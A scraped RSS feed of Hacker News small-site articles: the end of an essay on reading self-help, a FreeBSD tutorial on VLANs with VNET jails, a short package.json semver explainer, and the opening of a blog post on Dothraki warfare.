<p>And, perhaps most infuriatingly, <em>rejecting</em> self-help turns out to be hard. Any attempt to articulate a theory against self-help ends up sounding eerily like self-help itself. <a href="https://www.nytimes.com/2019/08/10/style/self-care/when-did-self-help-become-self-care.html">Much has been made</a> about the rise of self-<em><strong>care</strong></em>: an alleged rejection of the insecure striving encouraged by self-help. But somehow these new "anti-gurus"—<a href="https://en.wikipedia.org/wiki/Marianne_Williamson">Marianne Williamson</a>, <a href="https://en.wikipedia.org/wiki/Mark_Manson">Mark Manson</a>, <a href="http://sarahknightbooks.com/">Sarah Knight</a>—sermonize about acceptance and tranquility in exactly the same tenor as the self-help gurus before them.</p>

<p>So which is it? Is our obsession with self-help embarrassing or admirable? Is self-help snake oil or salvation?</p>

<p>I'm going to argue that <strong>it's both</strong>. Some self-help is terrible, individualistic hucksterism that the US has exported around the world. But <em>good</em> self-help also exists, and it provides a high-leverage way to lead a better, more fulfilling life.</p>

<hr>

<p><span>L</span>et's talk about <em>wisdom</em>. There are lots of definitions of wisdom, but I like <a href="http://www.paulgraham.com/wisdom.html">Paul Graham's</a>: "a wise person knows what to do in most situations, while a [knowledgeable]<sup id="fnref1"><a href="#fn1">1</a></sup> person knows what to do in situations where few others could." In other words, wise people are moderately successful in many domains, while knowledgeable people are very successful in a few. Here's a beautiful graph I made:</p>

<p><img src="https://cringle.io/rails/active_storage/blobs/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBKdz09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--9317b2a0df67d70ed93e8e6a57bb11f66526adba/image-1601845971542.png" alt="file"></p>

<p>So a neurosurgeon is smart because she can solve a narrow set of problems that few can, but she may not be <em>wise</em> because, on balance, she can't solve as many of life's problems as someone else. (She could <em>also</em> be wise of course, but it's not related to her smartness.)</p>

<p>How did the doctor become so smart? Well, she read <em>books</em> of course! And the stuff in those books was highly-specific, arcane knowledge about anatomy and neurons and...brain stuff. This brain stuff is devilishly difficult to learn, but once our doctor has completed her (lengthy) training she can solve problems few can.</p>

<p>But what if you wanted <em>wisdom</em>, not knowledge? Are there books that contain wisdom? In other words, are there books that give you general-purpose, one-size-fits-all advice for navigating life?</p>

<p>Of course there is! <strong>It's called self-help.</strong></p>

<p><img src="https://cringle.io/rails/active_storage/blobs/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBLQT09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--9e51f58b20f5b5bb3b5069650a0b77bdbfe8f0fd/image-1601845984963.jpg" alt="Angela Duckworth, author of Grit"></p>

<p>Angela Duckworth, author of <em>Grit</em>
</p>

<p>The stuff in, say, Angela Duckworth's <a href="https://www.goodreads.com/book/show/27213329-grit"><em>Grit</em></a> is wisdom. You can tell because</p>

<ol>
<li>It's incredibly easy to understand—e.g. "sticking with long-term goals improves life outcomes"</li>
<li>But <em>very</em> difficult to apply to real life</li>
</ol>

<table>
<thead>
<tr>
<th>Wisdom</th>
<th>Knowledge</th>
</tr>
</thead>
<tbody>
<tr>
<td>Easily understood</td>
<td>Difficult to learn</td>
</tr>
<tr>
<td>Widely applicable</td>
<td>Narrowly useful</td>
</tr>
<tr>
<td>Hard to implement</td>
<td>Easy to implement</td>
</tr>
<tr>
<td>Self-help</td>
<td>Textbooks</td>
</tr>
</tbody>
</table>

<p>Viewing self-help through this wisdom/knowledge lens clarifies the above paradoxes. We're embarrassed by self-help because (at its best) it's full of banal platitudes—but these are platitudes <em>because</em> they're so general. Specific rules like "if your boss likes golf and you want a raise, ask for it while taking her golfing" are too specific to be wisdom.</p>

<p>And we like reading self-help because it makes sense. When Tim Ferriss tells us to ruthlessly cut meetings out of our lives, it seems obvious! We nod our heads vigorously in agreement. But a few weeks later we find our calendar unchanged. We look back on <a href="https://www.goodreads.com/book/show/368593.The_4_Hour_Workweek"><em>The 4-Hour Work Week</em></a> and think, <em>what a bunch of nonsense, this whole self-help thing is bogus</em>.</p>

<p>But this is a hallmark of wisdom: it's trivial to read but nearly impossible to put into practice. We feel divinely inspired while reading <a href="https://www.goodreads.com/en/book/show/13185350-minimalism"><em>Minimalism</em></a>, but when it's time to actually cull our wardrobes, it turns out we have good reasons for keeping everything! For wisdom, the devil is in the details, and the details are exactly what nobody else can help you with.</p>

<p>The wisdom/knowledge distinction also explains why there's such a large overlap between business books and self-help: "business" has so much conceptual real estate that solving "business" problems requires tools that are closer to wisdom than to knowledge—no business book can predict what sorts of situations (businesses, market conditions, etc.) the reader will encounter, so instead it offers general, obvious-sounding rules.</p>

<p>Okay you get it: <strong>self-help</strong> is <strong>wisdom</strong>. So what?</p>

<hr>

<p><span>T</span>he wisdom/knowledge distinction is more than a curiosity; it can help us get more from the self-help genre. Once we understand the <em>purpose</em> of self-help (acquiring wisdom), we're in a better position to find good self-help and to extract the most from it. Here are a few tips and tricks.</p>

<h2>Read self-help that makes sense</h2>

<p>A good rule of thumb is that <em>arcane</em> wisdom is rarely right. By <em>arcane</em> I mean anything that is not immediately obvious, like Gwyneth Paltrow's exhortation to put <a href="https://www.huffpost.com/entry/jade-eggs-vagina-goop_n_588641dbe4b096b4a2335935">rocks in your vagina</a>. So advice can either be arcane or obvious, general or specific.</p>

<p><img src="https://cringle.io/rails/active_storage/blobs/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBLUT09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--111a8f5ad14b0dc5953a0f74620ddf8cac7b81a1/image-1601846024914.png" alt="Identifying good self-help"></p>

<p>And we want the <em>general</em> and <em>obvious</em> advice. If you hear something <a href="https://archive.org/details/mastercleanserwi00burr/page/16">dubious</a> like "drink lemon juice, cayenne pepper, and maple syrup for 40 days straight" because it will "eliminate toxins...cleanse the kidneys...[and] purify the glands" you should first ask yourself: is this an obvious universal truth? Does this make sense? Can I apply this to a variety of situations?</p>

<p>If the answer is "no," then it probably isn't the kind of sage wisdom we're looking for. That isn't to say that specific knowledge can't dramatically improve your life—certainly reading about new lifesaving medical treatments is worthwhile—but a good rule of thumb for filtering out <em>bad</em> self-help is to ask yourself: is this obvious?</p>

<p>It turns out that almost <em>all</em> the criticism of self-help involves stuff in the lower-right quadrant. When the <em>New Yorker</em> <a href="https://www.newyorker.com/magazine/2011/09/05/better-faster-stronger">pokes fun at</a> at Tim Ferriss they dwell on his human growth factor injections, his resveratrol overdose, his habit of weighing his feces—but they completely ignore Ferriss' more banal platitudes about defining your goals, shutting out distractions, and living intentionally. But it's these latter bits of wisdom that have made Ferriss famous, and when we read <em>Four Hour Work Week</em> it's this wisdom that enthralls us, not his breezy tutorial for doubling your reading speed.</p>

<p><img src="https://cringle.io/rails/active_storage/blobs/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBLZz09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--16e61ec1a32a462e7396550216c561559cd70c0a/image-1601846044391.jpg" alt="Tim Ferriss"></p>

<p>Tim Ferriss, author of <em>The 4-Hour Work Week</em>
</p>

<p>A good corollary here is that <em>old</em> self-help tends to be better, because</p>

<ol>
<li>Wisdom tends to be stable over time</li>
<li>Pseudoknowledge is eventually exposed</li>
</ol>

<h2>Examples, examples, examples</h2>

<p>Anecdotally, it seems that general rules require <em>more</em> examples to be understood. <a href="https://www.goodreads.com/book/show/4865.How_to_Win_Friends_and_Influence_People">Carnegie's</a> "be hearty in your approbation and lavish in your praise" <em>sounds</em> great. But I need to hear about Charles Dickens being spurred to greatness by a little praise from an editor, how a man's horrid children became angels after some kind words from their parents, how a business owner raised productivity by complimenting the craftsmanship of his workers. When we hear enough examples we can begin to see the places in our own lives where this wisdom fits.</p>

<p><img src="https://cringle.io/rails/active_storage/blobs/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBLdz09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--4163615707b88944c8c78c7ad8867fbf604cfacf/image-1601846224492.jpg" alt="Dale Carnegie"></p>

<p>Self-help legend Dale Carnegie</p>

<h2>Be patient (with self-help and yourself)</h2>

<p>It's a <a href="https://news.ycombinator.com/item?id=9508671">common complaint</a> that self-help books only give high-level advice and never explain <em>specifically</em> how to implement these changes.</p>

<p>But the whole thing with wisdom is that you <em>can't</em> prescribe a one-size-fits-all method of application. Good wisdom applies to so many different situations, in so many ways, that going through every possibility would take millennia.</p>

<p>So this is the final lesson: self-help is <em>hard</em>. We shouldn't beat ourselves up if one reading of <a href="https://www.goodreads.com/book/show/97411.Letters_from_a_Stoic"><em>Letters from a Stoic</em></a> doesn't transform us overnight. Reading wisdom is the easiest part of becoming wise.</p>

<p>A large part of the self-help's bad reputation is due to the fact that lots of people read self-help, but those same people seem to <em>keep</em> reading self-help.</p>

<p>Inc. Magazine has a particularly infuriating piece with the alarmist title <a href="https://www.inc.com/matthew-jones/11-billion-reasons-self-help-industry-doesnt-want-you-to-know-truth-about-happiness.html">11 Billion Reasons The Self Help Industry Doesn't Want You To Know The Truth About Happiness</a>. The whole argument is pretty much right there in the title, actually. Since the self-help industry is worth $11 billion—and, you know, <em>some</em> people out there still need help—then <em>obviously</em> the whole thing is this cynical scam where publishers trick the American public into buying stuff they know is bullshit.</p>

<p>But I think we read a lot of self-help because we <em>need</em> to. As I've already mentioned, we need <em>lots</em> of examples to drive this wisdom home. We should be more forgiving of self-help (the genre) and …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://tjcx.me/p/how-to-read-self-help">https://tjcx.me/p/how-to-read-self-help</a></em></p>]]>
            </description>
            <link>https://tjcx.me/p/how-to-read-self-help</link>
            <guid isPermaLink="false">hacker-news-small-sites-25682694</guid>
            <pubDate>Fri, 08 Jan 2021 08:16:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Routing and Firewalling Vlans with FreeBSD – Klara Inc]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25682645">thread link</a>) | @rodrigo975
<br/>
January 8, 2021 | https://klarasystems.com/articles/routing-and-firewalling-vlans-with-freebsd/ | <a href="https://web.archive.org/web/*/https://klarasystems.com/articles/routing-and-firewalling-vlans-with-freebsd/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>




<div>
<h2><strong>In this article we are going to look at and integrate two network isolation technologies, VLANs and VNET. VLANs are common place, and if you have done some network management or design then you are likely to have interacted with them. The second are FreeBSDs VNET virtual network stacks, a powerful network stack isolation technology that gives FreeBSD jails super powers.</strong></h2>



<p>Ethernet VLAN (standardised by <a href="https://en.wikipedia.org/wiki/IEEE_802.1Q">IEEE 802.1Q</a>) are an extension to Ethernet and provide an essential method for scaling network deployments. They are used in all environments to enable reuse of common infrastructure by isolating portions of networks from each other. VLANs allow the reuse of common cables, switches and routers to carry completely different networks. It is common to have data that must be separated from different networks carried on common cables until their VLAN tags are finally stripped at a gateway switch or router.</p>



<p>VLANs are implemented by inserting a 4-byte (32 bit) field into the Ethernet header, this field is referred to as the VLAN tag. The VLAN tag has a 12 bit VLAN ID field that carries a VLAN number. There can be up to 4096 VLAN IDs present in a network. Two VLAN IDs, 0 (0x0) and 4095 (0xFFF) are reserved. 0 is used to indicate that no VLAN ID is in use and the use of 0xFFF can be implementation defined.</p>



<div><figure><img data-attachment-id="3205" data-permalink="https://klarasystems.com/articles/routing-and-firewalling-vlans-with-freebsd/image-1/" data-orig-file="https://i2.wp.com/klarasystems.com/wp-content/uploads/2021/01/image-1.png?fit=420%2C45&amp;ssl=1" data-orig-size="420,45" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-1" data-image-description="" data-medium-file="https://i2.wp.com/klarasystems.com/wp-content/uploads/2021/01/image-1.png?fit=300%2C32&amp;ssl=1" data-large-file="https://i2.wp.com/klarasystems.com/wp-content/uploads/2021/01/image-1.png?fit=420%2C45&amp;ssl=1" loading="lazy" width="420" height="45" src="https://i2.wp.com/klarasystems.com/wp-content/uploads/2021/01/image-1.png?resize=420%2C45&amp;ssl=1" alt="" srcset="https://i2.wp.com/klarasystems.com/wp-content/uploads/2021/01/image-1.png?w=420&amp;ssl=1 420w, https://i2.wp.com/klarasystems.com/wp-content/uploads/2021/01/image-1.png?resize=300%2C32&amp;ssl=1 300w" sizes="(max-width: 420px) 100vw, 420px" data-recalc-dims="1"></figure></div>











<p>VLAN tags are automatically added and removed by devices with VLAN support. FreeBSD implements VLANs as child devices cloned from a parent device (this can be a real network interface such as an em(4) device or virtual vtnet(4) device). Typically, we name these cloned devices with the VLAN ID or number that the handle. In this article we will talk about VLAN interfaces that are created with this scheme, so VLAN number 5 on vtnet0 is vtnet0.5. This convention makes it much easier to track which devices are doing what in a system.</p>



<h4><strong>Using VLANs on FreeBSD</strong></h4>



<p>There are a few ways to build test networks to experiment with VLANs and FreeBSD, we can use real hardware; a couple of machines and some switches, but that makes it hard to provide an example that can be reproduced by everyone. We can also use a FreeBSD host, either physical or virtual with bridge, epair and tap interfaces. If you have a physical machine for testing we can use bhyve virtual machines, but if all you have is a virtual FreeBSD machine you can reproduce this network using VNET jails.</p>



<p>Logically our test setup looks like two hosts connected directly with an Ethernet cable so if this network resembles your environment it should be plenty:</p>



<figure><img data-attachment-id="3207" data-permalink="https://klarasystems.com/articles/routing-and-firewalling-vlans-with-freebsd/image-2-2/" data-orig-file="https://i1.wp.com/klarasystems.com/wp-content/uploads/2021/01/image-2.png?fit=420%2C182&amp;ssl=1" data-orig-size="420,182" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-2" data-image-description="" data-medium-file="https://i1.wp.com/klarasystems.com/wp-content/uploads/2021/01/image-2.png?fit=300%2C130&amp;ssl=1" data-large-file="https://i1.wp.com/klarasystems.com/wp-content/uploads/2021/01/image-2.png?fit=420%2C182&amp;ssl=1" loading="lazy" width="420" height="182" src="https://i1.wp.com/klarasystems.com/wp-content/uploads/2021/01/image-2.png?resize=420%2C182&amp;ssl=1" alt="" srcset="https://i1.wp.com/klarasystems.com/wp-content/uploads/2021/01/image-2.png?w=420&amp;ssl=1 420w, https://i1.wp.com/klarasystems.com/wp-content/uploads/2021/01/image-2.png?resize=300%2C130&amp;ssl=1 300w" sizes="(max-width: 420px) 100vw, 420px" data-recalc-dims="1"></figure>



<p>For the examples in this article we are going to use virtual machines connected together using tap and bridge interfaces and jails with epair interfaces on those virtual machines. Our example machines are called hostA and hostB, they are virtual machines with tap interfaces connected together through a bridge interface. On top of this we will build up a larger network inside using epair, bridge and jails. This setup could carry over to physical machines in the same data center or if connected together with a tunnel like GRE or IPsec, different data centers.</p>



<figure><img data-attachment-id="3209" data-permalink="https://klarasystems.com/articles/routing-and-firewalling-vlans-with-freebsd/image-3/" data-orig-file="https://i2.wp.com/klarasystems.com/wp-content/uploads/2021/01/image-3.png?fit=420%2C164&amp;ssl=1" data-orig-size="420,164" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-3" data-image-description="" data-medium-file="https://i2.wp.com/klarasystems.com/wp-content/uploads/2021/01/image-3.png?fit=300%2C117&amp;ssl=1" data-large-file="https://i2.wp.com/klarasystems.com/wp-content/uploads/2021/01/image-3.png?fit=420%2C164&amp;ssl=1" loading="lazy" width="420" height="164" src="https://i2.wp.com/klarasystems.com/wp-content/uploads/2021/01/image-3.png?resize=420%2C164&amp;ssl=1" alt="" srcset="https://i2.wp.com/klarasystems.com/wp-content/uploads/2021/01/image-3.png?w=420&amp;ssl=1 420w, https://i2.wp.com/klarasystems.com/wp-content/uploads/2021/01/image-3.png?resize=300%2C117&amp;ssl=1 300w" sizes="(max-width: 420px) 100vw, 420px" data-recalc-dims="1"></figure>



<p>The vtnet1 interfaces on both hostA and hostB are connected together with a bridge. Both are in the 10.0.128.0/24, with the hostA at 10.0.128.1 and hostB at 10.0.128.2. We can ping to perform a simple test to verify that traffic can pass between the two virtual machines via the bridge before we add VLANs into the mix.</p>



<pre><code>    root@hostA #  ping -c 1 10.0.128.2
    PING 10.0.128.2 (10.0.128.2): 56 data bytes
    64 bytes from 10.0.128.2: icmp_seq=0 ttl=64 time=2.647 ms

    --- 10.0.128.2 ping statistics ---
    1 packets transmitted, 1 packets received, 0.0% packet loss
    round-trip min/avg/max/stddev = 2.647/2.647/2.647/0.000 ms
</code></pre>



<p>We create a VLAN interface from a parent device dynamically using ifconfig or statically using cloned_interfaces in rc.conf (see <a href="https://www.freebsd.org/doc/handbook/network-vlan.html">the FreeBSD handbook</a> and <a href="https://www.freebsd.org/cgi/man.cgi?vlan">vlan(4) man page</a> for more information). We create the VLAN device with a name and indicate the parent device and VLAN number that will be used.</p>



<pre><code>    root@hostA # ifconfig vtnet1.5 create vlan 5 vlandev vtnet1 
    root@hostA # ifconfig vtnet1.5 inet 10.0.64.1/24 up
</code></pre>



<p>Once the interface is created we can configure it the way we would with any other interface in FreeBSD. We need to create a matching VLAN device on the hostB so we can experiment with VLAN tags.</p>



<pre><code>    root@hostB # ifconfig vtnet1.5 create vlan 5 vlandev vtnet1 
    root@hostB # ifconfig vtnet1.5 inet 10.0.64.2/24 up
</code></pre>



<h4><strong>Packet Captures for Debugging VLANs</strong></h4>



<p>While VLANs are not particularly complex technically, their ability to add new isolated networks also tends to add an extra layer of complexity and really reinforces confusion when you have to debug networking issues.</p>



<div data-columns="3" data-layout="50-25-25"><div>




<div><div>
<p>Did you know?</p>



<h2>You can maximize the <strong>power of your FreeBSD</strong> infrastructure with our <strong>Support Subscription!</strong></h2>




</div></div>




</div></div>



<p>For a parent interface we can see all the traffic that passes through it along with its link layer headers by running tcpdump with with -e flag. To avoid locking out the console on a busy remote system it can be a good idea to only capture a limited number of packets (add the -c flag with a count such as 1000 to do this).</p>



<pre><code>    # tcpdump -c 1000 -i vtnet1 -e</code></pre>



<p>Traffic from the parent interface, captured on the parent interface (in our example traffic to the 10.0.128.0/24 subnet) will appear without any VLAN tag and so will traffic captured on the VLAN interface (traffic on the 10.0.64.0/24 subnet). This is because the parent device will send and receive raw untagged traffic and the child VLAN device will strip away the tag before processing any further:</p>



<pre><code>    root@hostA #  tcpdump -i vtnet1 -e
    Password:
    tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
    listening on vtnet1, link-type EN10MB (Ethernet), capture size 262144 bytes
    19:49:55.906340 00:a0:98:67:03:ce (oui Unknown) &gt; 00:a0:98:05:09:2c (oui Unknown), ethertype IPv4 (0x0800), length 98: 10.0.128.1 &gt; 10.0.128.2: ICMP echo request, id 38148, seq 0, length 64
    19:49:55.908913 00:a0:98:05:09:2c (oui Unknown) &gt; 00:a0:98:67:03:ce (oui Unknown), ethertype IPv4 (0x0800), length 98: 10.0.128.2 &gt; 10.0.128.1: ICMP echo reply, id 38148, seq 0, length 64
    ^C
    2 packets captured
    2 packets received by filter
    0 packets dropped by kernel

    root@hostA # tcpdump -i vtnet1.5 -e
    tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
    listening on vtnet1.5, link-type EN10MB (Ethernet), capture size 262144 bytes
    19:58:17.234282 00:a0:98:67:03:ce (oui Unknown) &gt; 00:a0:98:05:09:2c (oui Unknown), ethertype IPv4 (0x0800), length 98: 10.0.64.1 &gt; 10.0.64.2: ICMP echo request, id 30725, seq 0, length 64
    19:58:17.238527 00:a0:98:05:09:2c (oui Unknown) &gt; 00:a0:98:67:03:ce (oui Unknown), ethertype IPv4 (0x0800), length 98: 10.0.64.2 &gt; 10.0.64.1: ICMP echo reply, id 30725, seq 0, length 64
    ^C
    2 packets captured
    2 packets received by filter
    0 packets dropped by kernel
</code></pre>



<p>However, traffic on the parent interface that has a VLAN tag (traffic to 10.0.64.0/24 subnet) will show up in captures on that interface with the tag:</p>



<pre><code>    root@hostA # tcpdump -i vtnet1 -e  
    tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
    listening on vtnet1, link-type EN10MB (Ethernet), capture size 262144 bytes
    19:59:12.596875 00:a0:98:67:03:ce (oui Unknown) &gt; 00:a0:98:05:09:2c (oui Unknown), ethertype 802.1Q (0x8100), length 102: vlan 5, p 0, ethertype IPv4, 10.0.64.1 &gt; 10.0.64.2: ICMP echo request, id 33029, seq 0, length 64
    19:59:12.600823 00:a0:98:05:09:2c (oui Unknown) &gt; 00:a0:98:67:03:ce (oui Unknown), ethertype 802.1Q (0x8100), length 102: vlan 5, p 0, ethertype IPv4, 10.0.64.2 &gt; 10.0.64.1: ICMP echo reply, id 33029, seq 0, length 64
    ^C
    2 packets captured
    2 packets received by filter
    0 packets dropped by kernel
</code></pre>



<p>Comparing these two captures you can see that when the VLAN tag isn’t present (such as when we capture on vtnet1.5) tcpdump doesn’t tell us there is no tag, it doesn’t say anything about VLANs at all. If you find yourself lost and start to wonder if VLANs have broken down, double check you are capturing in the correct place.</p>



<p>If you are not used to looking at its output, <em>tcpdump</em> isn’t the friendliest. You can always write the capture to a file (with the -w flag) and pull it back to your desktop and view with <em>Wireshark</em> or use <em>tshark</em> with the <em>-V</em> flag to get very verbose per field descriptions.</p>



<p>Our test network has two distinct /24 networks running over the same shared infrastructure (here a bridge device).</p>



<h4><strong>Combining VLANs and VNETs</strong></h4>



<p>FreeBSD jails are an excellent way to isolate software and give us the ability to run multiple logical machines on a single host with minimal overhead, VNETs enhance jails further and give them a full network stack. The network stack that the jail sees is almost identical to one that the host machine would see and the jail is able to manage and firewall this network in the same ways.</p>



<p>In a similar way to how we can isolate traffic from multiple applications or customers we can use jails and VNETs to give root level control over how that traffic is managed. VNET jails and VLANs make it possible for us to allow customers in a multi-tenant hosting scenario to have firewall level access over their traffic while isolating other customers traffic from their view. We might use this as we connect hosted applications together over physically separate machines either in another rack or in a data center on the other side of the planet.</p>



<h4><strong>Using VLANs with VNET Jails</strong></h4>



<p>Here we have a short example how to integrate VLANs into a jailed setup that will allow a customer to control the firewalling of traffic (there are more detailed instructions in this article on<a> </a><strong>“Virtualising Networks with FreeBSD VNET Jails</strong>“.</p>



<div data-columns="3" data-layout="50-25-25"><div>




<div><div>
<p>Did you know?</p>



<h2>We wrote about VNETs before in “<strong>Vi…</strong></h2></div></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://klarasystems.com/articles/routing-and-firewalling-vlans-with-freebsd/">https://klarasystems.com/articles/routing-and-firewalling-vlans-with-freebsd/</a></em></p>]]>
            </description>
            <link>https://klarasystems.com/articles/routing-and-firewalling-vlans-with-freebsd/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25682645</guid>
            <pubDate>Fri, 08 Jan 2021 08:06:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What's the difference between tilde (~) and caret (^) in the package.json file]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25682617">thread link</a>) | @jimmyk99
<br/>
January 7, 2021 | https://qirolab.com/questions/whats-the-difference-between-a-tilde-and-a-caret-in-the-packagejson-file | <a href="https://web.archive.org/web/*/https://qirolab.com/questions/whats-the-difference-between-a-tilde-and-a-caret-in-the-packagejson-file">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text" v-pre=""><p>For that first, you have to understand <a href="https://semver.org/" title="Semantic Versioning" target="_blank" rel="nofollow noreferrer noopener noreferrer">Semantic Versioning</a>. It is divided into three sections separated by a dot.</p>
<pre><code>1.0.2
major.minor.patch
</code></pre>
<p>Major, minor, and patch represent the different releases of a package.</p>
<ul>
<li>
<strong>MAJOR</strong> version when you make incompatible API changes,</li>
<li>
<strong>MINOR</strong> version when you add functionality in a backward-compatible manner, and</li>
<li>
<strong>PATCH</strong> version when you make backward-compatible bug fixes.</li>
</ul>
<p><code>~version</code> <strong>"Approximately equivalent to version"</strong>, will update you to all future <strong>patch</strong> versions, without incrementing the minor version. it means to install version <code>1.0.2</code> or the latest patch version such as <code>1.0.4</code>.</p>
<p><code>^version</code> <strong>"Compatible with version"</strong>, will update you to all future <strong>minor/patch</strong> versions, without incrementing the major version. It means to install version <code>1.0.2</code> or the latest minor or patch version such as <code>1.1.0</code>.</p>
</div></div>]]>
            </description>
            <link>https://qirolab.com/questions/whats-the-difference-between-a-tilde-and-a-caret-in-the-packagejson-file</link>
            <guid isPermaLink="false">hacker-news-small-sites-25682617</guid>
            <pubDate>Fri, 08 Jan 2021 07:58:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Collections: That Dothraki Horde, Part IV: Screamers and Howlers]]>
            </title>
            <description>
<![CDATA[
Score 47 | Comments 19 (<a href="https://news.ycombinator.com/item?id=25682359">thread link</a>) | @Illniyar
<br/>
January 7, 2021 | https://acoup.blog/2021/01/08/collections-that-dothraki-horde-part-iv-screamers-and-howlers/ | <a href="https://web.archive.org/web/*/https://acoup.blog/2021/01/08/collections-that-dothraki-horde-part-iv-screamers-and-howlers/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>This is the fourth part of a four part (<a href="https://acoup.blog/2020/12/04/collections-that-dothraki-horde-part-i-barbarian-couture/">I</a>, <a href="https://acoup.blog/2020/12/11/collections-that-dothraki-horde-part-ii-subsistence-on-the-hoof/">II</a>, <a href="https://acoup.blog/2020/12/18/collections-that-dothraki-horde-part-iii-horse-fiddles/">III</a>) look at the Dothraki from George R. R. Martin’s <em>A Song of Ice and Fire</em> and HBO’s <em>Game of Thrones</em>.  We’re looking at, in particular, if Martin’s claim that the Dothraki are “an amalgam of a number of steppe and plains cultures” can be sustained in the face of even basic knowledge about historical Steppe and Great Plains nomadic peoples.</p>



<p>Last week, we <a href="https://acoup.blog/2020/12/18/collections-that-dothraki-horde-part-iii-horse-fiddles/">concluded </a>that the vast majority of Dothraki culture, social organization, economic practices and family structure are effectively completely untethered from the historical realities of effectively any of the literally dozens of historical Great Plains Native Americans or Steppe nomads.  This week, we’re going to close out our look by discussing Dothraki warfare.  We’ll start with the visual – weapons and armor – and then move to the conceptual – strategy, operations and tactics.</p>



<p>And as always, if you like what you are reading here, please share it; if you really like it, you can support me on <a href="https://www.patreon.com/user?u=20122096">Patreon</a>. And if you want updates whenever a new post appears, you can click below for email updates or follow me on twitter (@BretDevereaux) for updates as to new posts as well as my occasional ancient history, foreign policy or military history musings.</p>






<p>Finally, as a reminder both of what we are investigating, <strong>the key statement we are really assessing here is <a href="https://www.westeros.org/Citadel/SSM/Entry/6040/">this one by George R.R. Martin</a>:</strong></p>



<blockquote><p>The Dothraki were actually fashioned as an amalgam of a number of steppe and plains cultures… Mongols and Huns, certainly, but also Alans, Sioux, Cheyenne, and various other Amerindian tribes… seasoned with a dash of pure fantasy.</p></blockquote>



<p>It is not the <em>existence</em> of a fantasy culture which draws our attention, but the explicit declaration that this fantasy culture is not merely inspired, but ‘fashioned as an amalgam’ of real cultures, which both existed in the past <em>and still exist today</em>, with only ‘a dash of pure fantasy.’  That line is important, to be clear, <strong>because it presents the fictional Dothraki as a statement on historical Native American and Eurasian nomads</strong> and – when combined with Martin’s statements that he relies on history to inform his work – that this statement is based in some sort of historical reality.</p>



<p>Which it isn’t.  But we’re getting ahead of ourselves.</p>



<h2>Where There’s a Whip…</h2>



<p>The Dothraki are described as having three main weapons: <strong>bows </strong>(<em>AGoT</em>, 86, 555, 558, 597, 669), <strong>whips </strong>(<em>AGoT</em>, 86, 194, 493, 555, 596, 669) and a <strong>curved sword called an <em>arakh</em></strong> (<em>AGoT</em> 85, 86, 327, 493, 555, 556, 559, 560, 596, 597, 669, 674); <strong>of these, the <em>arakh</em> is clearly the most prominent</strong> (I am sure I have missed a reference to a weapon here or there, but I hope the citations here give some sense of the relative weight each is given – the <em>arakh</em> is the most frequently mentioned by some distance).  When a Dothraki warrior enters <em>Vaes Dothrak</em>, each, “unbelted his <em>arakh</em> and handed it to a waiting slave, and any other weapons he carried as well” – after the <em>arakh</em>, the other weapons are seemingly afterthoughts (<em>AGoT</em>, 327).  The prominence of the <em>arakh</em> in the narrative is underscored by the fact that it is the only one of these weapons whose name we learn in Dothraki, or which is described in terms of its shape or special function (<em>AGoT</em>, 85), while the bows and whips remain just bows and whips (ironic, as it was Steppe <em>bows</em>, not Steppe swords, which were unusual).</p>



